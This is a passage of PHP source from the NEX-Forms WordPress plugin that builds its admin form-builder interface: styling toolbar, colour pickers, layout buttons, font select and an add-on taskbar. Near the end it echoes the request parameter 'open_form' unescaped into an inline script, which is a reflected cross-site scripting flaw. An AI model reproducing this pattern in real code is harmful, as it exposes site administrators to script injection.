							</div>
						">';
						$output .= '<div class="styling-tool">';
							$output .= '<h3>Styling tools</h3>';
							/*$output .= '<div class="panel-group" id="fields_accordion" role="tablist" aria-multiselectable="false">';
								$output .= '<div class="panel panel-default">';
									$output .= '<div class="panel-heading" role="tab" id="headingOne">';
										$output .= '<h4 class="panel-title">';
											$output .= '<a role="button" class="collapsed" data-toggle="collapse" data-parent="#fields_accordion" href="#collapseOne" aria-expanded="false" aria-controls="collapseOne">';
												$output .= 'Font';
											$output .= '</a>';
										$output .= '</h4>';
									$output .= ' </div>';
								$output .= '<div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne" style="height: 0px;">';
									$output .= '<div class="panel-body">';
										
								
								$output .= '</div>';
							
							$output .= '</div>';
						$output .= '</div>';
							*/
						
						$output .= '<div role="toolbar" class="btn-toolbar">';
						$output .= '<div role="group" class="btn-group style-alignment">';
							$output .= '<button class="btn active styling-tool-item btn-default" data-toggle="tooltip" data-style-tool="default-tool" type="button" title="Normal Mode (Alt+C&nbsp;or&nbsp;Enter)"><i class="fa fa-mouse-pointer"></i></button>';
						$output .= '</div>';
						
						$output .= '<div class="divider"></div>';
						
						$output .= '<div role="group" class="btn-group style-font">';
							
							$output .= '<button data-style-tool-group="font-style" class="btn styling-tool-item btn-default" data-style-tool="text-bold" data-toggle="tooltip" type="button" title="Bold"><i class="fa fa-bold"></i></button>';
							$output .= '<button data-style-tool-group="font-style" class="btn styling-tool-item" data-style-tool="text-italic" data-toggle="tooltip" type="button" title="Italic"><i class="fa fa-italic"></i></button>';
							$output .= '<button data-style-tool-group="font-style" class="btn styling-tool-item" data-style-tool="text-underline" data-toggle="tooltip" type="button" title="Underline"><i class="fa fa-underline"></i></button>';
						$output .= '</div>';
						
						
						
						$output .= '<div role="group" class="btn-group style-alignment">';
							
							$output .= '<button class="btn styling-tool-item btn-default" data-style-tool-group="text-align" data-style-tool="align-left" data-toggle="tooltip" type="button" title="Left align text"><i class="fa fa-align-left"></i></button>';
							$output .= '<button class="btn styling-tool-item" data-style-tool-group="text-align" data-style-tool="align-center" data-toggle="tooltip" type="button" title="Center align text"><i class="fa fa-align-center"></i></button>';
							$output .= '<button class="btn styling-tool-item" data-style-tool-group="text-align" data-style-tool="align-right" data-toggle="tooltip" type="button" title="Right align text"><i class="fa fa-align-right"></i></button>';
						$output .= '</div>';
						
						$output .= '<div role="group" class="btn-group style-size">';
							
							$output .= '<button data-style-tool-group="size" class="btn styling-tool-item btn-default" data-style-tool="size-sm" data-toggle="tooltip" type="button" title="Size Small"><i class="fa fa-font" style="font-size:10px"></i></button>';
							$output .= '<button data-style-tool-group="size" class="btn styling-tool-item" data-style-tool="size-normal" data-toggle="tooltip" type="button" title="Size Normal"><i class="fa fa-font" style="font-size:13px"></i></button>';
							$output .= '<button data-style-tool-group="size" class="btn styling-tool-item" data-style-tool="size-lg" data-toggle="tooltip" type="button" title="Size Large"><i class="fa fa-font" style="font-size:16px"></i></button>';
						$output .= '</div>';
												
										$output .= '</div>';
										$output .= '<div class="divider"></div>';
										$output .= '<div class="input-group input-group-sm">';
											$output .= '<input type="text" class="form-control font-color-tool" name="font-color-tool" id="bs-color">
													<span class="input-group-addon  styling-tool-item" data-style-tool-group="color" data-style-tool="set-font-color" data-toggle="tooltip" title="Text Color">';
												$output .= '<i class="fa fa-font"></i>';
											$output .= '</span>';
										$output .= '</div>';
										$output .= '<div class="input-group input-group-sm">';
											$output .= '<input type="text" class="form-control background-color-tool" name="background-color-tool" id="bs-color">
													<span class="input-group-addon  styling-tool-item" data-style-tool-group="color" data-style-tool="set-background-color" data-toggle="tooltip" title="Background Color">';
												$output .= '<i class="fa fa-paint-brush"></i>';
											$output .= '</span>';
										$output .= '</div>';
										
										$output .= '<div class="input-group input-group-sm">';
											$output .= '<input type="text" class="form-control border-color-tool" name="border-color-tool" id="bs-color">
													<span class="input-group-addon  styling-tool-item" data-style-tool-group="color" data-style-tool="set-border-color" data-toggle="tooltip" title="Border Color">';
												$output .= '<i class="fa fa-square-o"></i>';
											$output .= '</span>';
										$output .= '</div>';
										
										$output .= '<div class="divider style-layout-1"></div>';
										$output .= '<div role="group" class="btn-group ">';
							
											$output .= '<button data-style-tool-group="layout" class="btn styling-tool-item btn-default set_layout set_layout_left" data-style-tool="layout-left" data-toggle="tooltip" type="button" title="Label Left"></button>';
											$output .= '<button data-style-tool-group="layout" class="btn styling-tool-item set_layout set_layout_right" data-style-tool="layout-right" data-toggle="tooltip" type="button" title="Label Right"></button>';
											
										$output .= '</div>';
										$output .= '<div role="group" class="btn-group style-layout-2">';
							
											$output .= '<button data-style-tool-group="layout" class="btn styling-tool-item btn-default  set_layout set_layout_top" data-style-tool="layout-top" data-toggle="tooltip" type="button" title="Label Top"></button>';
											$output .= '<button data-style-tool-group="layout" class="btn styling-tool-item set_layout set_layout_hide" data-style-tool="layout-hide" data-toggle="tooltip" type="button" title="Hide Label"></button>';
											
										$output .= '</div>';
										
									
								$output .= '<div class="divider"></div>';
								
										
								
										$output .= '<div class="input-group input-group-sm">';
											$output .= '<div role="group" class="btn-group ">
											
											
											<button data-style-tool-group="font-family" class="btn styling-tool-item btn-default" data-style-tool="font-family" data-toggle="tooltip" type="button" title="Font Family"><i class="fa fa-google"></i></button>';
							
											
											
											
											$output .= '<select name="google_fonts" class="sfm form-control">';
												$get_google_fonts = new NF5_googlefonts();
												$output .= $get_google_fonts->get_google_fonts();
											$output .= '</select>'; //<span class="input-group-addon"><i><input type="checkbox" checked="checked" title="Show Preview" data-placement="top" data-toggle="tooltip" class="bs-tooltip" name="show-font-preview"></i></span>
										$output .= '</div></div>';
										
									$output .= '</div>';
								$output .= '</div>';
								
						
					$output .= '</div>';
				$output .= '</div>';
			//TOOLBAR
				$output .= '<div class="taskbar toolbar">';
					/*$output .= '<a class="menu-item show-dashboard">';
						$output .= '<i class="fa fa-dashboard"></i><br>Dashboard';
					$output .= '</a>';*/
					$output .= '
					<div class="custom_layout_options" style="display:none;">
					  	<div class="old_custom_layout_name hidden"></div>
						<div class="col-xs-6">
							<input type="text" class="form-control custom_layout_name" placeholder="Layout Name" name="custom_layout_name">
						</div>
					  	<div class="col-xs-3">
							<button class="btn btn-success save_custom_layout">Save Layout</button>
						</div>
						<div class="col-xs-3">
							<button class="btn btn-danger cancel_custom_layout">Cancel</button>
						</div>
					</div>
					';
					
					$output .= '
					<div class="dropdown menu-item logo dropup  nf_tutorial_step_10 nf_tutorial " data-placement="top" title="Taskbar <span class=\'fa fa-close\'></span>" data-content="
					  		Click on this logo to see the current available add-ons and social sites for NEX-Forms.<br><br>
							Switch between all your open forms on this bar. If a form needs saving it will have a blue border on the bottom.
							<div class=\'popover-footer\'>
								<div class=\'next_tut_step badge\'>
									<i class=\'fa fa-arrow-right\'></i>
								</div>
								<div class=\'prev_tut_step badge \'>
									<i class=\'fa fa-arrow-left\'></i>
								</div>
							</div>
						">
					  <button class="btn btn-default dropdown-toggle" type="button" id="dropdownMenu1" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
						<img src="'.plugins_url('/css/images/menu_icon.png',dirname(__FILE__)).'">
						<span class="caret"></span>
					  </button>
					  <ul class="dropdown-menu" aria-labelledby="dropdownMenu1">
					  	
						<li class="taskbar_head">NEX-Forms <span class="version">V6</span></li>
						<li role="separator" class="divider"></li>
						
						
						<li class="dropdown-header">Add-ons</li>
						';
						if ( is_plugin_active( 'nex-forms-themes-add-on/main.php' ))
							$output .= '<li><a class="add_on_item"><i class="fa fa-check got_add_on"></i> Form Themes</li> </a>';
						else
							$output .= '<li><a class="add_on_item"><i class="fa fa-puzzle-piece"></i> Form Themes </a><a class="btn btn-success buy_item" href="http://codecanyon.net/item/form-themes-for-nexforms/10037800?ref=Basix" target="_blank">Buy</a></li>';
							
						if ( is_plugin_active( 'nex-forms-export-to-pdf/main.php' ))
							$output .= '<li><a class="add_on_item"><i class="fa fa-check got_add_on"></i> PDF Creator</li> </a>';
						else
							$output .= '<li><a class="add_on_item"><i class="fa fa-puzzle-piece"></i> PDF Creator </a><a class="btn btn-success buy_item" href="http://codecanyon.net/item/export-to-pdf-for-nexforms/11220942?ref=Basix" target="_blank">Buy</a></li>';
							
						if ( is_plugin_active( 'nex-forms-paypal-add-on/main.php' ))
							$output .= '<li><a class="add_on_item"><i class="fa fa-check got_add_on"></i> PayPal</li> </a>';
						else
							$output .= '<li><a class="add_on_item"><i class="fa fa-puzzle-piece"></i> PayPal </a> <a class="btn btn-success buy_item" href="http://codecanyon.net/item/paypal-for-nexforms/12311864?ref=Basix" target="_blank">Buy</a></li>';
							
						
						if ( is_plugin_active( 'nex-forms-digital-signatures/main.php' ))
							$output .= '<li><a class="add_on_item"><i class="fa fa-check got_add_on"></i> Digital Signatures</li> </a>';
						else
							$output .= '<li><a class="add_on_item"><i class="fa fa-puzzle-piece"></i> Digital Signatures </a> <a class="btn btn-success buy_item" href="https://codecanyon.net/item/digital-signatures-for-nexforms/17044658?ref=Basix" target="_blank">Buy</a></li>';
						
						
						if ( is_plugin_active( 'nex-forms-mail-chimp-add-on/main.php' ))
							$output .= '<li><a class="add_on_item"><i class="fa fa-check got_add_on"></i> MailChimp</li> </a>';
						else
							$output .= '<li><a class="add_on_item"><i class="fa fa-puzzle-piece"></i> MailChimp </a> <a class="btn btn-success buy_item" href="https://codecanyon.net/item/mailchimp-for-nexforms/18030221?ref=Basix" target="_blank">Buy</a></li>';
							
						
						if ( is_plugin_active( 'nex-forms-getresponse-add-on/main.php' ))
							$output .= '<li><a class="add_on_item"><i class="fa fa-check got_add_on"></i> GetResponse</li> </a>';
						else
							$output .= '<li><a class="add_on_item"><i class="fa fa-puzzle-piece"></i> GetResponse </a> <a class="btn btn-success buy_item" href="http://codecanyon.net/user/basix/portfolio?ref=Basix" target="_blank">Buy</a></li>';
							
							
							
						$output .= '
						
						<li class="dropdown-header">Follow Basix</li>
						<li><a target="_blank" href="http://codecanyon.net/user/Basix/follow" class=""><i class="fa fa-leaf"></i> Envato/Codecanoyn</li></a>
						<li><a target="_blank" href="https://www.facebook.com/NEX-Forms-The-Ultimate-WordPress-Form-Builder-263136677228437/"><i class="fa fa-facebook"></i> Facebook</li></a>
						<li><a target="_blank" href="http://twitter.com/Basixweb"><i class="fa fa-twitter"></i> Twitter</li></a>
						
						
						
					  </ul>
					</div>
					<div class="help-text-bar">This is a help text bar</div>
					';		
					
					
					
					$output .= '<div class="task-items-bar">';
					
					$output .= '<div class="dropdown menu-item dropup" data-placement="top">
					  <button class="btn btn-default  dropdown-toggle" type="button" id="dropdownMenu1" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
						<span class="opened_form_title"></span>
						<span class="caret"></span>
					  </button>
					  <ul class="dropdown-menu form-list" aria-labelledby="dropdownMenu1">
					  	
						
						
					  </ul>
					</div>
					';	
					
					
					$output .= '<div class="open_user_alerts"><i class="fa fa-comment"></i></div><div class="user_alerts"><h2><span class="fa fa-comment"></span>&nbsp;&nbsp;Notifications  <i title="Close" class="fa fa-close"></i><i title="Clear Notifications" class="fa fa-trash-o"></i>&nbsp;&nbsp;</h2><div class="alerts_inner"></div></div>';	
								
					$output .= '</div>';
					
					
				$output .= '</div>';
			$open_form = isset($_REQUEST['open_form']) ? $_REQUEST['open_form'] : '';
			if($open_form)
					{
					$output .= '
					<script type="text/javascript">
					jQuery(document).ready(
						function()
							{
							jQuery(\'div.nex-forms-container\').html(\'<div class="loading"><i class="fa fa-circle-o-notch fa-spin"></i></div>\')
							setTimeout(
								function()
									{
									load_nexform('.$_REQUEST['open_form'].');
									jQuery(\'#form_update_id\').text('.$_REQUEST['open_form'].')
									},200
								);
							}
						);
					</script>';	
					}
			
			echo $output;	
			
		}
	}
}
?>